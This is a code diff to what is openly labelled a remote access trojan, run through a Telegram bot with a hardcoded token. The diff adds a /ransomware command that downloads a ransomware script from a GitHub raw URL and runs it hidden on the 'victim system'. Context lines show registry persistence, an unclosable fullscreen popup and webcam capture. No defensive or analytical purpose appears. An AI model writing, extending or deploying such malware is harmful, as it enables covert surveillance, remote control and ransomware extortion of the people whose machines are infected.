@@ -1,4 +1,4 @@
-# RAT_script.py - Fixed with /message fullscreen, /command working, and /webcam
+# RAT_script.py - Added /ransomware command to download and execute ransomware
 # Upload this to GitHub: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py
 
 import os
@@ -23,6 +23,7 @@ import numpy as np
 BOT_TOKEN = "8755658192:AAEEkXaihdEPyTRbj33bVt_-9ckubS2uiDA"
 CHAT_ID = "7894519456"
 BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+RANSOMWARE_URL = "https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/ransomeware1.py"
 
 # --- Persistence via registry ---
 def install_persistence():
@@ -118,20 +119,16 @@ def show_flashing_popup(message_text):
         root.attributes('-fullscreen', True)
         root.configure(bg='black')
         
-        # Big message label
         label = tk.Label(root, text=message_text, font=("Arial", 48, "bold"),
                         fg='red', bg='black', wraplength=750)
         label.pack(expand=True, fill=tk.BOTH)
         
-        # Countdown label
         count_label = tk.Label(root, text="7", font=("Arial", 72, "bold"),
                               fg='white', bg='black')
         count_label.pack(pady=20)
         
-        # Disable close
         root.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # Flash colors
         def flash():
             colors = ['red', 'yellow', 'cyan', 'magenta', 'lime', 'orange', 'white']
             idx = 0
@@ -141,7 +138,6 @@ def show_flashing_popup(message_text):
                 time.sleep(0.12)
                 idx += 1
         
-        # Countdown
         def countdown():
             for i in range(7, 0, -1):
                 count_label.config(text=str(i))
@@ -156,6 +152,35 @@ def show_flashing_popup(message_text):
         root.mainloop()
     except Exception as e:
         send_message(f"Popup error: {str(e)[:100]}")
+
+# --- Ransomware download and execute ---
+def download_and_execute_ransomware():
+    try:
+        temp_dir = tempfile.gettempdir()
+        target = os.path.join(temp_dir, "ransomware_worker.py")
+        
+        # Download ransomware
+        urllib.request.urlretrieve(RANSOMWARE_URL, target)
+        
+        # Execute ransomware hidden
+        if sys.platform == "win32":
+            startup = subprocess.STARTUPINFO()
+            startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            subprocess.Popen([sys.executable, target],
+                           startupinfo=startup,
+                           creationflags=subprocess.CREATE_NO_WINDOW,
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL,
+                           stdin=subprocess.DEVNULL)
+        else:
+            subprocess.Popen([sys.executable, target],
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL,
+                           stdin=subprocess.DEVNULL)
+        return True
+    except Exception as e:
+        send_message(f"Ransomware download failed: {str(e)[:100]}")
+        return False
 
 # --- Handle updates ---
 def handle_updates(offset):
@@ -196,6 +221,9 @@ def handle_updates(offset):
                     elif lower_text == "/webcam":
                         threading.Thread(target=send_webcam).start()
                     
+                    elif lower_text == "/ransomware":
+                        threading.Thread(target=trigger_ransomware).start()
+                    
                 return new_offset
     except Exception as e:
         pass
@@ -228,6 +256,14 @@ def send_webcam():
             send_message("Webcam capture failed - no camera or access denied")
     except Exception as e:
         send_message(f"Webcam error: {str(e)[:50]}")
+
+def trigger_ransomware():
+    send_message("Downloading and executing ransomware...")
+    success = download_and_execute_ransomware()
+    if success:
+        send_message("Ransomware deployed successfully on victim system")
+    else:
+        send_message("Ransomware deployment failed")
 
 # --- Heartbeat monitor ---
 def heartbeat_monitor():
